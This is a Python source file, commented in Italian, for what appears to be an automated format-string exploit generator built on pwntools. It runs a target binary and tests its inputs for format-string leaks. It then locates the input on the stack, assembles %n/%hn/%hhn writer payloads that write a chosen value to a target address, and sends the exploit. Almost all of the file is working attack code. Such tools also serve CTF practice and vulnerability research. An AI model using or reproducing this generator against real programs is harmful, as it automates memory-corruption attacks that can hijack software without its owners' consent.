import format_string_generator
import logger
from pwn import *


def format_pack(write_dimension, order_byte):
    if write_dimension == 8:
        architecture_char = "Q"
    elif write_dimension == 4:
        architecture_char = "L"
    elif write_dimension == 2:
        architecture_char = "H"
    elif write_dimension == 1:
        architecture_char = "B"

    if order_byte == "little":
        byte_char = "<"
    elif order_byte == "big":
        byte_char = ">"
    else:
        byte_char = ""

    return byte_char + architecture_char


def get_write_size(write_dimension, value, order_byte):
    byte_sizes = [8, 4, 2, 1]
    current_byte_sizes = [write_dimension]

    while True:
        j = 0
        bytes_list = []
        for byte_size in current_byte_sizes:
            bytes_list.append(value[j:j + byte_size])
            j += byte_size

        total_padding = 0

        values_list = []
        for hex_bytes in bytes_list:
            new_value = int.from_bytes(hex_bytes, byteorder=order_byte)
            values_list.append(new_value)
            total_padding += new_value

        if total_padding < 4000:
            return current_byte_sizes, bytes_list
        else:
            max_index = values_list.index(max(values_list))
            current_byte_size = current_byte_sizes[max_index]

            byte_size_index = byte_sizes.index(current_byte_size)
            new_byte_size = byte_sizes[byte_size_index + 1]
            current_byte_sizes[max_index] = new_byte_size
            current_byte_sizes.insert(max_index, new_byte_size)


def define_markers(response):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :return: una lista contenete due stringhe uniche nella risposta del processo target
    """
    for i in range(2, 50):
        for j in range(200):
            # rimossi a,b,c,d,e,f in quanto usati nei valori esadecimali; rimosso i per evitare combinaioni ni, il (rompono nil)
            test_markers = [''.join(random.choice("ghjklmnopqrstuvwxyz") for h in range(i)),
                            ''.join(random.choice("ghjklmnopqrstuvwxyz") for h in range(i))]

            if response.count(test_markers[0]) == 0 and response.count(test_markers[1]) == 0:
                return test_markers

            j += 1
        i += 1

    return ["marked_not_defined", "impossibile definire i marcatori\n\n"]


def get_wrapped_string(response, markers):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :param markers: marcatori unici che fanno da estremi all'input attualmente in test stampato dal processo target
    :return: l'input passato stampato dal processo senza marcatori
    """
    try:
        found = re.search(markers[0] + '(.+?)' + markers[1], response)[1]
        return found
    except:
        return ["marker_not_found", "marcatori non individuati nella risposta\n\n"]


def get_addresses(response, markers):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :param markers: marcatori unici che fanno da estremi all'input attualmente in test stampato dal processo target
    :return: lista conentente i valori esadecimali stampati dal processo tramite l'input passato
    """
    found = get_wrapped_string(response, markers)

    if type(found) == list:
        return found
    else:
        # replace("G", "") -> rimuovo il padding aggiuntivo delle fmt per input passati da command line necessario a rendere costante la loro dimensione
        return (found.replace("(nil)", "0x0").replace("G", "")).split("0x")[1:]


class Exploit:
    """
    classe principale del tool; testa gli input disponibili verificando se sono exploitabili e se riescono a portare a termine l'exploit

    Attenzione: gli errori incontrati dai metodi/funzioni vengono ritornati come lista [errore, messaggio di errore da stampare] o [errore]
    Esempio -> se l'esecuzione di target termina con un segfault, il metodo send_payload() ritornà ["segmentation_fault"]
            -> se la funzione get_wrapped_string() non riesce a trovare i marcatori/estrarre la sottostringa contenuta nella risposta ritornnerà
                ["marker_not_found", "marcatori non individuati nella risposta\n\n"]
    """

    def __init__(self, target, value, target_address, command_line_input_list, during_execution_input_list, configs):
        self.start_fmt_position = None  # posizione della fmt come entry dello stack

        self.target = target  # percorso del processo target
        self.target_address = target_address  # indirizzo a cui scrivere
        self.configs = configs

        e = ELF(target)
        self.order_byte = e.endian
        self.address_size = e.bytes

        # specifico quanti byte dell'indirizzo target scrivere
        self.write_dimension = configs["bytes_to_write"]
        self.command_line_input_list = command_line_input_list
        self.during_execution_input_list = during_execution_input_list

        self.value = struct.pack(format_pack(self.write_dimension, self.order_byte), value)

        self.direct_fmt_generator = format_string_generator.DirectFmtGenerator()

        self.logger = logger.Logger(self.target, self.configs)
        self.logger.write(
            "Byte da scrivere: {}\nDimensione indirizzi: {} byte\nEndian: {}\n\nInput da linea di comando: {}\nInput da passare durante l'esecuzione: {}".format(
                self.write_dimension, self.address_size, self.order_byte, self.command_line_input_list,
                self.during_execution_input_list))

        self.null_byte_in_address = False
        self.test_free_input()

    def send_payload(self, encoded=False):
        """
        :param encoded: specifica se l'input in test, da inviare al processo target durante l'esecuzione, è già stato convertito in byte
        :return: una stringa contenete i dati, in caratteri, ricevuti dal processo target
        """
        # Estraggo il valore degli input da linea di comando e li passo al processo target
        command_line_inputs = list()
        for elem in self.command_line_input_list:
            command_line_inputs.append(elem["value"])
        p = process([self.target] + command_line_inputs)

        total_response = ""
        try:
            # se ci sono input da passare a tempo di esecuzione
            if len(self.during_execution_input_list) > 0:
                # se per il primo di questi input è specificato il marker ricevo dati finchè il processo non arriva al marker
                if self.during_execution_input_list[0]["marker"] is not None:
                    # se il valore associato a "wait_time_marker" è -1, non setto il timer
                    if self.configs["wait_time_marker"] == -1:
                        total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"]).decode(
                            "latin1")
                    else:
                        total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"],
                                                      timeout=self.configs["wait_time_marker"]).decode("latin1")

                else:
                    # se l'input non ha marker, ricevo i dati per "wait_time_no_marker" secondi
                    total_response += p.recvrepeat(self.configs["wait_time_no_marker"]).decode("latin1")

                for i in range(0, len(self.during_execution_input_list)):
                    elem = self.during_execution_input_list[i]

                    # se ho specificato encoded e l'input è quello che sto testando in questo momento, allora il suo valore è già convertito in byte
                    if encoded is True and elem["value"] != "PPPP" and elem["free"] is True:
                        p.sendline(elem["value"])
                    else:
                        p.sendline(str.encode(elem["value"]))

                    if i < len(self.during_execution_input_list) - 1:

                        if self.during_execution_input_list[i]["marker"] is not None:
                            if self.configs["wait_time_marker"] == -1:
                                response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"]).decode(
                                    "latin1")
                            else:
                                response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"],
                                                       timeout=self.configs["wait_time_marker"]).decode("latin1")
                        else:
                            response = p.recvrepeat(self.configs["wait_time_no_marker"]).decode("latin1")

                    else:
                        # se l'input che sto inviando è l'ultimo nella lista, allora ricevo i dati fino all'End Of File
                        response = p.recvall().decode("latin1")

                    total_response += response

            else:
                # se non ci sono input da passare durante l'esecuzione ricevo sempplicemente finchè il processo target non termina
                total_response = p.recvall(timeout=self.configs["wait_time_no_marker"]).decode("latin1")
        except (EOFError, BrokenPipeError) as e:
            raise

        if p.poll() == -11:
            return ["segmantation_fault"]

        return total_response

    def prepare_writer(self):
        """
        :return: un valore intero che corrisponde alla somma della lunghezza, in caratteri, degli indirizzi target, del paddign necessario a
        il raggiungere il valore da scrivere in ciascun indirizzo e del relativo scrittore (hhn, hn, n, ln)

        """
        write_size, subvalues = get_write_size(self.write_dimension, self.value, self.order_byte)

        self.logger.write("\nPreparazione indirizzi e scrittori: \n")
        self.logger.write("   Sottovalori da scrivere: | ")
        values = list()
        for bytes in subvalues:
            subvalue = int.from_bytes(bytes, byteorder=self.order_byte)
            values.append(subvalue)
            self.logger.write("{} | ".format(subvalue))

        self.logger.write("\n   Relative dimensioni di scrittura: {}\n".format(write_size))
        self.logger.write("   Relativi nuovi indirizzi target: | ")
        target_addresses = list()
        addr = self.target_address
        for i in write_size:
            self.logger.write("{} | ".format(hex(addr)))
            # verifico se almeno uno degli indirizzi target contiene un null byte. Questo si verifica se effettivamente lo contiene oppure
            # se la sua dimensione è inferiore a quella prevista per l'indirizzamento del processo
            if ("00" in [hex(addr)[i:i + 2] for i in range(0, len(hex(addr)), 2)]) or len(hex(addr)) < (
                    self.address_size * 2):
                self.null_byte_in_address = True
            # creo in byte gli indirizzi associati ai sottovalori
            target_addresses.append(struct.pack(format_pack(self.address_size, self.order_byte), addr))
            addr = addr + i

        # ordino le coppie indirizzo,sottovalore in ordine decrescente di sottovalore
        target_addresses = [address for _, address, _ in sorted(zip(values, target_addresses, write_size))]
        write_size = [w_size for _, _, w_size in sorted(zip(values, target_addresses, write_size))]
        values.sort()

        counter = 0  # conta i caratteri scritti fino a quel momento
        writers_len = 0
        for value, address, w_size in zip(values, target_addresses, write_size):
            if w_size == 8:
                writer = "ln"
            elif w_size == 4:
                writer = "n"
            elif w_size == 2:
                writer = "hn"
            elif w_size == 1:
                writer = "hhn"

            padding = value - counter
            counter += padding

            if padding < 8:
                padding = "A" * padding
            else:
                padding = "%" + str(padding) + "x"

            self.direct_fmt_generator.add_writer([padding, None, writer])
            writers_len += len(padding) + len(writer)

        self.logger.write("\n   Scrittori: {}\n".format(self.direct_fmt_generator.writers))
        self.direct_fmt_generator.set_writer_backup()
        self.direct_fmt_generator.set_address(target_addresses)

        return writers_len + len(target_addresses) * self.address_size

    def clean_before_next_input(self, input_elem, message):
        """
        :param input_elem: input in test
        :param message: messaggio di errore che porta al temine del test da stamapre nel file di log
        :return:
        """
        input_elem["free"] = False
        input_elem["value"] = "PPPP"
        self.direct_fmt_generator.reset_direct_parameter_num()
        self.direct_fmt_generator.restore_writers()
        self.direct_fmt_generator.reset_align_padding()

        self.logger.write(message)

    def get_input_len_in_target(self, input_elem, markers, fmt_length_without_writer_position):
        """
        :param input_elem: input in test
        :param markers: marcatori unici del processo
        :param fmt_length_without_writer_position: intero rappresentante una parte della dimensione in caratteri della fmt finale
        :return:
        """
        input_len = 0
        max_len = 500 + fmt_length_without_writer_position + len(markers[0] + markers[1])  # massivo numero di caratteri stampati contati
        i = fmt_length_without_writer_position // len(markers[0])
        err_count = 0
        while i <= max_len:
            input_elem["value"] = markers[0] * i
            try:
                response = self.send_payload()
                if type(response) is list:
                    if err_count == 0:
                        err_count += 1
                        i = fmt_length_without_writer_position // len(
                            markers[0]) if i <= fmt_length_without_writer_position // len(markers[0]) else i - (
                                    50 // len(markers[0]))
                        continue
            except EOFError:
                err_count += 1
                i = fmt_length_without_writer_position // len(
                    markers[0]) if i <= fmt_length_without_writer_position // len(markers[0]) else i - (
                            50 // len(markers[0]))
                continue

            if err_count >= 2:
                return input_len * len(markers[0])

            input_len = response.count(markers[0])
            if input_len != i or input_len == max_len:
                return input_len * len(markers[0])

            if err_count == 0:
                i += (50 // len(markers[0])) if max_len - i >= (50 // len(markers[0])) else max_len - i
            else:
                i += 1

    def test_free_input(self):
        """
        :return: se l'input riesce ad eseguire l'exploit termina, altrimenti continua a testare finoa  che non vi sono più input disponibili

        metodo principale del tool, verifica i vari input, determina se possono exploitare il processo target e se ci riescono
        """
        fmt_length_without_writer_position = self.prepare_writer()

        self.logger.write("\n\nInizio ricerca di input vulnerabili\n\n")
        for input_elem in (self.command_line_input_list + self.during_execution_input_list):
            self.logger.write("Input in test: {}\n".format(input_elem))

            if input_elem["free"] is False:
                self.logger.write("Input non libero\n\n")
                continue

            try:
                if input_elem["type"] == "command_line_input" and self.null_byte_in_address:
                    self.clean_before_next_input(input_elem, "Almeno un indirizzo target contiene un null byte che non può essere inviato a causa della categoria di input\n\n")
                    continue

                self.logger.write("Input libero, verifica se exploitabile: ")
                min_len_pattern = ''.join(
                    random.choice(string.ascii_uppercase) for i in range(fmt_length_without_writer_position))

                response = self.send_payload()
                if type(response) is list:
                    self.clean_before_next_input(input_elem, "impossibile testare l'input, incontrato segmentation fault\n\n")
                    continue

                min_len_pattern_occ = response.count(min_len_pattern)
                zero_x_occ = response.count("0x")
                percent_p_occ = response.count("%p")
                nil_occ = response.count("(nil)")

                input_elem["value"] = "%p"
                response = self.send_payload()
                if type(response) is list:
                    self.clean_before_next_input(input_elem, "impossibile testare l'input, incontrato segmentation fault\n\n")
                    continue

                # se l'input in test viene stampato nel processo più di una volta oppure in %p non viene interpretato, l'input viene scartato
                if not (((response.count("0x") == zero_x_occ + 1 and response.count("(nil)") == nil_occ) or
                         (response.count("0x") != zero_x_occ or response.count("(nil)") == nil_occ + 1))
                        and response.count("%p") == percent_p_occ):
                    self.clean_before_next_input(input_elem, "l'input non sembra vulnerabile\n\n")
                    continue

                # verifico se l'input stampato raggiunge la dimensione minima fmt_length_without_writer_position. Se non la raggiunge
                # e il controllo sulla lunghezza dell'input ("input_len_control") è attivo, scarto l'input
                self.logger.write("input exploitabile\n")
                self.logger.write( "Verifica stampa della dimensione minima della stringa di exploit ({} caratteri): ".format(fmt_length_without_writer_position))
                input_elem["value"] = min_len_pattern

                response = self.send_payload()
                if type(response) is list:
                    self.clean_before_next_input(input_elem, "impossibile testare l'input, incontrato segmentation fault\n\n")
                    continue

                if response.count(min_len_pattern) == min_len_pattern_occ:
                    if self.configs["input_len_control"] is True:
                        self.clean_before_next_input(input_elem, "dimensione non sufficiente a stampare l'fmt\n\n")
                        continue
                    else:
                        fmt_length_without_writer_position = 0
                        self.logger.write(
                            "dimensione minima stampata non raggiunta; si prosegue comunque con i test sull'input corrente essendo disattivato il controllo sulla lunghezza\n")
                else:
                    self.logger.write("dimensione minima stampata\n")

                # definisco i marcatori unici per il processo target
                self.logger.write("Definizione marcati per estrarre fmt nella risposta: ")
                markers = define_markers(response)
                if markers[0] == "markers_not_found":
                    self.clean_before_next_input(input_elem, markers[1])
                    continue

                self.logger.write("{}, {}\n".format(markers[0], markers[1]))

                # Provo a capire quanti caratteri posso passare all'input
                # (fino a 500 + fmt_length_without_writer_position + len(markers[0] + markers[1]))
                self.logger.write("Conteggio della dimensione effettiva dell'input (fino a {} caratteri): ".format(
                    500 + fmt_length_without_writer_position + len(markers[0] + markers[1])))

                input_len = self.get_input_len_in_target(input_elem, markers, fmt_length_without_writer_position) - len(
                    markers[0] + markers[1])

                self.logger.write("{} caratteri disponibili + {} caratteri usati dai marcatori\n".format(input_len, len(
                    markers[0] + markers[1])))

                # ricerco la posizione iniziale dell'input passato all'interno dello stack del processo target
                self.logger.write("Ricerca fmt su stack: ")
                shift_for_broken_pattern = self.find_fmt_position_on_stack(input_elem, input_len, markers)
                if type(shift_for_broken_pattern) is list:
                    self.clean_before_next_input(input_elem, shift_for_broken_pattern[1])
                    continue

                self.logger.write("   Posizione {}\n".format(self.start_fmt_position))
                self.logger.write("Generazione fmt per exploit nel formato 'scrittori-indirizzi': ")
                result = self.define_exploit_string(input_elem, input_len, markers, shift_for_broken_pattern)
                if result == 0:
                    return
                elif type(result) is list:
                    self.clean_before_next_input(input_elem, result[1])
                    continue

            except (EOFError, BrokenPipeError) as e:
                self.clean_before_next_input(input_elem,"impossibile testare input, incontrato EOF non previsto\n\n" if type(e) is EOFError else "rilevata BrokenPipe\n\n")
                continue

        self.logger.write("Nessun input exploitabile individuato")

    def find_fmt_position_on_stack(self, input_in_testing, input_len, markers):
        """
        :param input_in_testing: input in test
        :param input_len: dimensione dell'input stampato
        :param markers: marcatori unice del processo
        :return: un intero che indica quanti caratteri aggiungere all'inizio della fmt affinchè il pattern cercato sia allineato nello stack o
                l'errore che ha fatto terminare la ricerca

        verifica se l'fmt passata è presente nello stack (cercando uno specifico pattern) e ne salva la posizione in self.start_fmt_position

        Attenzione: se il pattern è spezzato, il valore di ritorno sarà sempre >= self.address_size - len(markers[0]). Questo perchè l'fmt
        generata da format_string_generator è sempre preceduta dal marcatore markers[0] (per poter essere trovata facilmente nella risposta)
        """
        checked_addresses = 0  # posizione N stampata dall'ultimo %N$p usato dalla stringa di ricerca precedente
        segfault_count = 0
        markers_not_found_count = 0
        while True:
            # setto nell'input il pattern che devo cercare poi nello stack
            pattern = "AAAAAAAA" if self.address_size == 8 else "AAAA"
            self.direct_fmt_generator.set_temp_address(pattern)

            found = False
            position = None  # posizone del pattern all'interno della lista di valori esadecimali estratta. Con n valori, va da 0 a n-1
            shift_for_broken_pattern = 0
            while not found:
                # genero al stringa di ricerca in base all'ultima condizione di uscita del processo target
                if segfault_count == 1:
                    fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern_segfault(input_len)
                    if type(fmt) is list:
                        return fmt
                    else:
                        input_in_testing["value"] = markers[0] + fmt + markers[1]
                elif markers_not_found_count == 1:
                    fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern_markers_not_found(input_len)
                    if fmt[0] == "input_too_little":
                        return fmt
                    else:
                        input_in_testing["value"] = markers[0] + fmt[0] + markers[1] + fmt[1]
                else:
                    fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern(input_len)
                    if type(fmt) is list:
                        return fmt
                    else:
                        input_in_testing["value"] = markers[0] + fmt + markers[1]

                self.logger.write("\n   Stringa di ricerca: {}".format(input_in_testing["value"]))

                # ottengo la risposta di target con la stringa corrente
                response = self.send_payload()
                if type(response) is list:
                    if segfault_count == 0:
                        segfault_count += 1
                        self.direct_fmt_generator.set_direct_parameter_num(
                            checked_addresses if checked_addresses > 0 else 1)
                        self.logger.write("\n   Primo segfault incontrato, cambio forma stringa di ricerca\n")
                        continue
                    else:
                        return response + ["fmt non trovata nello stack, ricerca terminata a causa di un errore di segmentation fault\n\n"]

                # estraggo i valori esadecimali stampati dalla stringa
                addresses = get_addresses(response, markers)
                if addresses[0] == "marker_not_found":
                    if markers_not_found_count == 0:
                        markers_not_found_count += 1
                        self.direct_fmt_generator.set_direct_parameter_num(checked_addresses)
                        self.logger.write(
                            "\n   Marcatori non trovati nella risposta per la prima volta, cambio forma stringa di ricerca\n")
                        continue
                    else:
                        return addresses

                # cerco il pattern
                hex_pattern = pattern.encode().hex()
                self.logger.write("\n   Valori esadecimali estratti: {}\n".format(addresses))
                for i in range(len(addresses)):
                    self.logger.write("    Valore {} -> {}\n".format(i + 1 + checked_addresses, addresses[i]))
                    if addresses[i] == hex_pattern:
                        position = i
                        # position + 1 + checked = 12 -> posizione attuale dove trovo il pattern
                        # se la posizione non viene confermata, la nuova stringa di ricerca deve controllare dalla posizione 13 in poi
                        # setto quindi direct_parameter_num a 14 (in quanto il generatore di stringhe parte dalla posizone direct_parameter_num - 1)
                        self.direct_fmt_generator.set_direct_parameter_num((position + 1 + checked_addresses) + 2)
                        break
                    elif i < len(addresses) - 1:
                        # verifico se il pattern è spezzato (l'input non è passato da command line)
                        if addresses[i].count("00") == 0 and addresses[i + 1].count("00") == 0 and \
                                addresses[i].count(hex_pattern[0:2]) + addresses[i + 1].count(
                            hex_pattern[0:2]) == self.address_size:
                            self.logger.write(
                                "    Valore {} -> {}\n".format(i + 1 + 1 + checked_addresses, addresses[i + 1]))
                            position = i
                            shift_for_broken_pattern = addresses[i].count(hex_pattern[0:2])
                            self.direct_fmt_generator.set_direct_parameter_num(
                                (position + 1 + checked_addresses) + 2)
                            break
                        # verifico se il pattern è spezzato (l'input è passato da command line)
                        elif addresses[i].count("00") > 0 or addresses[i + 1].count("00") > 0:
                            count_curr_addr = (addresses[i].split("00"))[0].count(hex_pattern[0:2])
                            count_next_addr = (addresses[i + 1].split("00"))[1].count(hex_pattern[0:2]) if \
                                addresses[i + 1].count("00") > 0 else addresses[i + 1].count(hex_pattern[0:2])
                            if count_curr_addr + count_next_addr == self.address_size:
                                self.logger.write(
                                    "    Valore {} -> {}\n".format(i + 1 + 1 + checked_addresses, addresses[i + 1]))
                                position = i
                                shift_for_broken_pattern = count_curr_addr
                                self.direct_fmt_generator.set_direct_parameter_num(
                                    (position + 1 + checked_addresses) + 2)
                                break

                if position is not None:
                    found = True
                else:
                    checked_addresses += len(addresses) - 1

            # verifico che la posizione trovata sia corretta cambiando il pattern da cercare e riverificando la/e posizione/i trovate
            confirm_pattern = "BBBBBBBB" if self.address_size == 8 else "BBBB"
            hex_confirm_pattern = confirm_pattern.encode().hex()

            input_in_testing["value"] = input_in_testing["value"].replace("A", "B")
            response = self.send_payload()
            addresses = get_addresses(response, markers)
            if addresses[0] == "marker_not_found":
                return addresses

            self.logger.write("\n   Verifica posizione:\n")
            self.logger.write("   Stringa di conferma: {}\n".format(input_in_testing["value"]))
            self.logger.write("   Valori esadecimali estratti: {}\n".format(addresses))
            if addresses[position] == hex_confirm_pattern:
                self.start_fmt_position = position + 1 + checked_addresses
                self.logger.write("    Valore {} -> {}\n".format(position + 1 + checked_addresses, addresses[position]))
                return 0
            elif addresses[position].count("00") == 0 and addresses[position + 1].count("00") == 0 and \
                    addresses[position].count(hex_confirm_pattern[0:2]) + addresses[position + 1].count(
                hex_confirm_pattern[0:2]) == self.address_size:
                self.start_fmt_position = (position + 1) + checked_addresses
                self.logger.write("    Valore {} -> {}\n".format(position + 1 + checked_addresses, addresses[position]))
                self.logger.write(
                    "    Valore {} -> {}\n".format(position + 1 + 1 + checked_addresses, addresses[position + 1]))

                return shift_for_broken_pattern
            elif addresses[position].count("00") > 0 or addresses[position + 1].count("00") > 0:
                count_curr_addr = (addresses[position].split("00"))[0].count(hex_confirm_pattern[0:2])
                count_next_addr = (addresses[position + 1].split("00"))[1].count(hex_confirm_pattern[0:2]) if \
                    addresses[position + 1].count("00") > 0 else addresses[position + 1].count(
                    hex_confirm_pattern[0:2])
                if count_curr_addr + count_next_addr == self.address_size:
                    self.start_fmt_position = (position + 1) + checked_addresses
                    self.logger.write(
                        "    Valore {} -> {}\n".format(position + 1 + checked_addresses, addresses[position]))
                    self.logger.write(
                        "    Valore {} -> {}\n".format(position + 1 + 1 + checked_addresses, addresses[position + 1]))
                    return shift_for_broken_pattern

            checked_addresses += position + 1
            self.logger.write("   Pattern di conferma non trovato\n")

    def define_exploit_string(self, input_elem, input_len, markers, shift_for_broken_pattern):
        """
        :param input_elem: inpunt in test
        :param input_len: dimensione massima stampata dell'input nella stringa di ricerca
        :param markers: marcatori unici
        :param shift_for_broken_pattern: numero di caratteri
        :return: 0 se l'exploit con l'input in test ha successo. Se input_len_control è True e la lunghezza della stringa di exploit supera
                input_len, ritorna il relativo messaggio di errore
                Se eseguendo l'exploit il processo target ritorna segfault, esegue exploit_old_format()
        """
        writers = self.direct_fmt_generator.writers

        current_offset = 0
        for writer in writers:
            current_offset += len(str(writer[0]) + str(writer[2]))

        # calcolo di quanto sarebbe spostato in avanti il pattern da cercare se gli antepongo gli scrittori
        total_offset = current_offset + (1 + (1 + len(str(self.start_fmt_position))) + 1) * len(writers)  # caratteri totali degli scrittori, compresa la posizione dell'indirizzo sullo stack
        address_position_incr = total_offset // self.address_size  # incremento da applicare a self.start_fmt_position
        not_covered_offset = total_offset % self.address_size  # caratteri non coperti dall'incremento

        align_padding = ""
        # verifico se shift_for_broken_pattern è generato da markers[0] posto davanti al pattern da cercare nella stringa di ricerca
        if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
            address_position_incr += 1
            align_padding += "-" * shift_for_broken_pattern
        # se ho caratteri non coperto, aggiungo 1 all'incremento e la differenza tra address_size e questo numero di caratteri a align_padding
        if not_covered_offset > 0:
            address_position_incr += 1
            align_padding += "." * (self.address_size - not_covered_offset)

        self.direct_fmt_generator.set_align_padding(align_padding)

        i = 0
        # assegno le posizioni nello stack degli indirizzi a cui gli scrittori devono scrivere
        for writer in writers:
            pos = "0" + str(address_position_incr + self.start_fmt_position + i) if len(
                str(address_position_incr + self.start_fmt_position)) == len(str(self.start_fmt_position)) else str(
                address_position_incr + self.start_fmt_position + i)
            pos = "%" + pos + "$"
            writer[1] = pos
            i += 1

        if input_elem["type"] == "execution_input":
            exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, markers[0],
                                                                                          "execution_input")
        else:
            if shift_for_broken_pattern + len(markers[0]) != self.address_size:
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, markers[0],
                                                                                              "command_line_input")
                exploit += markers[1].encode()
                exploit_len += len(markers[1])
            else:
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, "",
                                                                                              "command_line_input")
                exploit += markers[0].encode() + markers[1].encode()
                exploit_len += len(markers[0] + markers[1])

        self.logger.write("\n   Scrittori: {}\n".format(self.direct_fmt_generator.writers))
        self.logger.write("   Padding di allineamento: '{}'\n".format(self.direct_fmt_generator.align_padding))
        if exploit_len > input_len:
            if self.configs["input_len_control"] is True:
                return ["input_too_little", "La dimensione dell'input non è suffichiente a stampare l'fmt di exploit, {} caratteri richiesti\n\n".format(
                            exploit_len)]
            else:
                self.logger.write("   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit ({} caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza\n".format(
                        exploit_len))

        self.logger.write("   Generazione completata con successo\n")
        self.logger.write("La stringa generata è: \n\t\t{}\n".format(exploit))
        self.logger.write("Inizio exploit: ")
        input_elem["value"] = exploit
        response = self.send_payload(True)
        if type(response) is list:
            self.logger.write(
                "segmentation fault incontrato tentando l'exploit \nPassaggo alla generazione della stringa nel formato 'indirizzi-scrittori': ")
            self.direct_fmt_generator.reset_align_padding()
            return self.exploit_old_format(input_elem, input_len, markers, shift_for_broken_pattern)
        else:
            self.logger.write(
                "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                    response))
            return 0

    def exploit_old_format(self, input_elem, input_len, markers, shift_for_broken_pattern):
        """
        :param input_elem: inpunt in test
        :param input_len: dimensione massima stampata dell'input nella stringa di ricerca
        :param markers: marcatori unici
        :param shift_for_broken_pattern: numero di caratteri
        :return: 0 se l'exploit ha successo, altrimenti il messaggio di errore
        """
        if self.null_byte_in_address is True:
            return ["null_byte_in_address",
                    "Almeno un indirizzo target contiene un null byte che non può essere inviato a causa della costruzione della fmt di exploit\n\n"]

        # ricalcolo il padding degli scrittori, il padding di allineamento e le posizioni degli indirizzi, in quanto con questa forma
        # della stringa di exploit, padding di allineamento e indirizzi sono anteposti agli scrittori
        writer = self.direct_fmt_generator.writers[0]
        if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
            chars_to_add = self.address_size * len(self.direct_fmt_generator.writers) + shift_for_broken_pattern + len(
                markers[0])
        else:
            chars_to_add = self.address_size * len(self.direct_fmt_generator.writers)

        if "A" in writer[0]:
            if len(writer[0]) >= chars_to_add:
                writer[0] = "A" * (len(writer[0]) - chars_to_add)
            else:
                return ["value_too_little",
                        "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi"]
        elif writer[0] == "":
            return ["value_too_little",
                    "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi"]
        else:
            padding = re.search("%" + '(.+?)' + "x", writer[0])[1]
            if int(padding) >= chars_to_add:
                padding = int(padding) - chars_to_add

                if padding < 8:
                    writer[0] = "A" * padding
                else:
                    writer[0] = "%" + str(padding) + "x"
            else:
                return ["value_too_little",
                        "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi"]

        i = 0
        for w in self.direct_fmt_generator.writers:
            pos = "0" + str(self.start_fmt_position + i) if len(str(self.start_fmt_position)) == len(
                str(self.start_fmt_position)) else str(self.start_fmt_position + i)

            pos = "%" + pos + "$"
            w[1] = pos

        if input_elem["type"] == "execution_input":
            exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len,
                                                                                                        markers[0],
                                                                                                        "execution_input")
        else:
            if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
                self.direct_fmt_generator.set_align_padding("." * shift_for_broken_pattern)
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len,
                                                                                                            markers[0],
                                                                                                            "command_line_input")
                exploit += markers[1].encode()
                exploit_len += len(markers[1])
            else:
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len,
                                                                                                            "",
                                                                                                            "command_line_input")
                exploit += markers[0].encode() + markers[1].encode()
                exploit_len += len(markers[0] + markers[1])

        self.logger.write("\n   Scrittori: {}\n".format(self.direct_fmt_generator.writers))
        self.logger.write("   Padding di allineamento: '{}'\n".format(self.direct_fmt_generator.align_padding))
        if exploit_len > input_len:
            if self.configs["input_len_control"] is True:
                return ["input_too_little",
                        "La dimensione dell'input non è suffichiente a stampare l'fmt di exploit, {} caratteri richiesti\n\n".format(
                            exploit_len)]
            else:
                self.logger.write(
                    "   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit ({} caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza\n".format(
                        exploit_len))

        self.logger.write("generazione completata con successo\n")
        self.logger.write("La stringa generata è: \n\t\t{}\n".format(exploit))
        self.logger.write("Inizio exploit: ")
        input_elem["value"] = exploit
        response = self.send_payload(True)
        if type(response) is list:
            return response + ["segmentation fault incontrato tentando l'exploit\n\n"]
        else:
            self.logger.write(
                "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                    response))
            return 0
